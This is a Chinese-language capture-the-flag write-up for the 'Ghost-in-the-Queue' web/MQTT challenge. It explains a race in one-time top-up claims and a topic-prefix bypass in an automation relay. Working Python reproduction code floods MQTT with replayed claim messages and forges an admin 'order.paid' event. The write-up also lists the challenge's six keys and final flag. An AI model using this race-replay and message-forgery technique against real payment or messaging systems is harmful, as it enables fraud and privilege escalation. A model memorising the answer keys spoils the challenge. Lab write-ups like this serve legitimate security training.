# Web · Ghost-in-the-Queue

## 结果

```text
flag{MyGyp8qmPOFVEpcqUcFUuCFkTxrlaMGxr7tqL076}
```

## 题目结构

题面同时暴露 HTTP 与 TLS MQTT：

- HTTP：`<TARGET_HOST>:<TARGET_HTTP_PORT>`
- MQTT：`<TARGET_HOST>:<TARGET_MQTT_PORT>`，必须 TLS
- MQTT 账号：`alice`
- HTTP Bearer：`alice-token-7f3d9c`
- Vault 共 6 个 key，全部提交后返回最终 flag

核心漏洞有两类：

1. 一次性 `topup` claim 在首次核销前存在并发窗口，可以在 90 秒内重复入账。
2. `automation` relay 只校验 `target` 是否以 `internal/audit/` 开头，实际投递
   使用 `payload.forward`，可向内部主题转发消息。

## 六把 key

| slot | key | 利用链 |
| --- | --- | --- |
| k1 | `key1-9f27c4a1d3e8` | echo 作业 approval_id 复用到 get_key1 |
| k2 | `key2-5be810cc9742` | 对 cancelled badge 订单伪造 `order.paid role=admin` |
| k3 | `key3-77aa02d4f1c6` | 两笔 ≥150 的 paid 订单触发 GOLD loyalty |
| k4 | `key4-c931e58b02ad` | 余额放大后购买 `key4-crown` |
| k5 | `key5-20df77ac19b3` | 0x21 telemetry 越界回读 boot token，再取 0x30 配置转储 |
| k6 | `key6-8831bb55e04f` | 同一订单双退款触发 integrity.alert |

## 快速复现

### 1. 初始化余额

```python
import json, ssl, time, uuid, requests
import paho.mqtt.client as mqtt

base = "http://<TARGET_HOST>:<TARGET_HTTP_PORT>"
headers = {"Authorization": "Bearer alice-token-7f3d9c"}

r = requests.post(f"{base}/api/topup", headers=headers, timeout=10)
claim = r.json()["claim_token"]

client = mqtt.Client(client_id="alice-repro", protocol=mqtt.MQTTv311)
client.username_pw_set("alice", "alice-mqtt-s3cret")
client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)
client.connect("<TARGET_HOST>", <TARGET_MQTT_PORT>, 30)
client.loop_start()

for i in range(60):
    client.publish("tenant/alice/topup/events", json.dumps({
        "type": "topup.requested",
        "claim_token": claim,
        "user": "alice",
        "topup_id": f"repro-{i}-{uuid.uuid4().hex[:8]}"
    }), qos=0)
client.loop_stop()
client.disconnect()
```

余额从 100 放大到足够购买 crown 后，执行：

```python
requests.post(f"{base}/api/orders", headers=headers,
              json={"item": "key4-crown", "coupon": "GHOST60"})
requests.post(f"{base}/api/orders", headers=headers,
              json={"item": "gold-plate"})
requests.post(f"{base}/api/orders", headers=headers,
              json={"item": "gold-plate"})
requests.post(f"{base}/api/orders", headers=headers,
              json={"item": "key2-badge"})
```

### 2. 伪造 badge 订单已支付

`key2-badge` 的普通下单返回 `restricted item: admin role required`，但订单已经创建
并处于 cancelled。MQTT 向 `tenant/alice/orders/events` 发布：

```json
{
  "type": "order.paid",
  "id": "<BADGE_ORDER_ID>",
  "order_id": "<BADGE_ORDER_ID>",
  "item": "key2-badge",
  "price": 60,
  "paid": 60,
  "status": "paid",
  "role": "admin",
  "tenant": "alice",
  "user": "alice"
}
```

随后 `GET /api/shipments` 返回 `key2-5be810cc9742`。

### 3. 提交与读取 vault

```python
keys = [
  "key1-9f27c4a1d3e8", "key2-5be810cc9742",
  "key3-77aa02d4f1c6", "key4-c931e58b02ad",
  "key5-20df77ac19b3", "key6-8831bb55e04f",
]
for key in keys:
    requests.post(f"{base}/api/vault/submit", headers=headers, json={"key": key})

print(requests.get(f"{base}/api/vault", headers=headers).json()["flag"])
```

最终 vault：

```json
{"complete":true,"total":6,"unlocked":["k1","k2","k3","k4","k5","k6"],
 "accepted":"k2","flag":"flag{MyGyp8qmPOFVEpcqUcFUuCFkTxrlaMGxr7tqL076}"}
```

## 关键脚本

- `scripts/ghost-in-the-queue/fresh_scene_run.py`
- `scripts/ghost-in-the-queue/k2_attack.py`

两个脚本中的动态 host/port 和临时订单号需要按当前实例替换。仓库已移除平台凭据。

## 证据

- `final_vault.txt`：六 key 全解锁及最终 flag
- `fresh_scene_run_console.txt`：新场景完整利用回显
- `k2_attack_console.txt`：badge 订单伪造与 shipment 回显
- `static_keys_verified.txt`：vault 对静态 key 的接受记录
